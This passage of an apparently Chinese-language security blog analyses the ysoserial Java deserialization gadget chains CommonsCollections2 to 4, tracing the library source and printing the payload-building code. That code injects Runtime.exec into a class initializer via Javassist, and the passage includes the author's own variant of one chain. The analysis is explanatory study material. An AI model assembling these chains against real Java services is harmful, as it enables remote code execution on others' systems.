class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">         _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">             _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">             _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">             <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">             <span class="comment">// Check if this is the main class</span></span><br><span class="line">             <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                 _transletIndex = i;</span><br><span class="line">             &#125;</span><br><span class="line">         ...</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * This method generates an instance of the translet class that is</span></span><br><span class="line"><span class="comment">  * wrapped inside this Template. The translet instance will later</span></span><br><span class="line"><span class="comment">  * be wrapped inside a Transformer object.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">     <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">         <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">         <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>有了以上方法后，考虑构建相应对象（并转换为字节码），构建过程中用JavaAssist机制插入恶意命令，在解析时触发；<br>这里的StubTransletPayload继承了AbstractTranslet类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// use template gadget class</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line"><span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line"><span class="comment">// run command in static initializer</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">    command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">    <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure>
+
+<p>clazz.makeClassInitializer().insertAfter(cmd); 的效果如下，在static部分插入了恶意命令，类被加载时就会执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">    	Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后通过反射为templates的相应field赋值（_bytecode和_name为必须，_tfactory可选）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inject class bytes into instance</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">    classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line"><span class="keyword">return</span> templates;</span><br></pre></td></tr></table></figure>
+
+<p>由此构造出利用对象，命令执行的触发方式为调用**templates.newTransformer()**，其中会调用getTransletInstance()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>本链的起始点是PriorityQueue类，查看其readObject方法并一路往下跟到siftDown<br>此处将根据是否拥有比较器，进入不同的比较方法中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">       s.readInt();</span><br><span class="line"></span><br><span class="line">       queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in all elements.</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">           queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">	<span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">	heapify();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">           siftDown(i, (E) queue[i]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">           siftDownUsingComparator(k, x);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           siftDownComparable(k, x);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>ysoserial的构造中传入了自定义的比较器，因此来看看siftDownUsingComparator的实现，调用了比较器的compare方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而ysoserial中使用了TransformingComparator类，关键代码如下，可以发现compare中调用了this.transformer.transform方法<br>那就可以利用InvokerTransformer的反射机制去调用newTransform了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接看看ysoserial的构造方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">// mock method name until armed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);		</span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">	<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">	<span class="comment">// stub data for replacement later</span></span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch method called by comparator</span></span><br><span class="line">	Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// switch contents of queue</span></span><br><span class="line">	<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">	queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">	queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一眼看感觉有点懵，为啥一开始的InvokerTransformer初始化不直接指定为newTransformer，以及为什么要toString，还有为啥不直接往queue里add templates。这里参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1756#toc-3%E7%9A%84%E8%AE%B2%E8%A7%A3%EF%BC%9A">https://xz.aliyun.com/t/1756#toc-3的讲解：</a><br>第一个问题的简单理解是，构造过程中add两次之后就会先触发一次compare（即如下代码中add-&gt;offer-&gt;siftUp，后续和siftDown差不多），这时候的transform应该先调toString以防构造过程中出错；构造完了，再给他切成newTransformer为后续反序列化攻击做准备</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Inserts the specified element into this priority queue.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; (as specified by &#123;<span class="doctag">@link</span> Queue#offer&#125;)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassCastException if the specified element cannot be</span></span><br><span class="line"><span class="comment"> *         compared with elements currently in this priority queue</span></span><br><span class="line"><span class="comment"> *         according to the priority queue&#x27;s ordering</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException if the specified element is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">        grow(i + <span class="number">1</span>);</span><br><span class="line">    size = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        queue[<span class="number">0</span>] = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个问题上，其实是可以的，在InvokerTransformer初始化为toString的基础上，只要传入的Object能被toString即可通过比较，比如如下实现（不需要后续再反射修改对象）；ysoserial的写法可能纯粹是为了美观</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(templates);</span><br><span class="line">queue.add(<span class="string">&quot;nothing&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h5><p>Q：PriorityQueue的queue 已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素？<br>A：成员使用transient关键字修饰，是为了序列化时不写入流中（该成员可能含有敏感信息，出于保护不写入）</p>
+<h4 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h4><h5 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>该链综合了链1和链2的利用方式<br>首先同样构造TemplatesImpl对象（见上述分析，需要调用对象的newTransformer()触发）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>
+
+<p>之后是如下构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>与链1的差别在于用InstantiateTransformer代替了InvokerTransformer（查了查是为了绕过针对InvokerTransformer的防御）<br>从以下源码实现得知，其transform函数逻辑为通过反射机制获取一个类构造函数进行调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时使用了TrAXFilter.class，查看该类的构造函数，可以看到调用了templates.newTransformer();，即串起了调用链：<br>(注意这里 TemplatesImpl 类是 Templates 的实现，从而可以作为参数传入)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">   &#123;</span><br><span class="line">_templates = templates;</span><br><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">       _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">       _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造过程就拿1和2的拼一下就完事了，略</p>
+<h4 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h4><h5 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h5><p>本链在CommonsCollections2的基础上改造，与链1-&gt;链3类似用InstantiateTransformer代替InvokerTransformer，不再重复分析</p>
+<h5 id="利用链构造-3"><a href="#利用链构造-3" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>ysoserial提供的构造，大量利用了反射机制，在链构造完毕后修改值：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">		paramTypes, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers</span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>
+
+<p>自己改的构造，要点是在构造完queue之后再通过反射修改其comparator的值，避免构造过程中触发payload，与链2的思路类似</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> createTemplatesImpl();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span 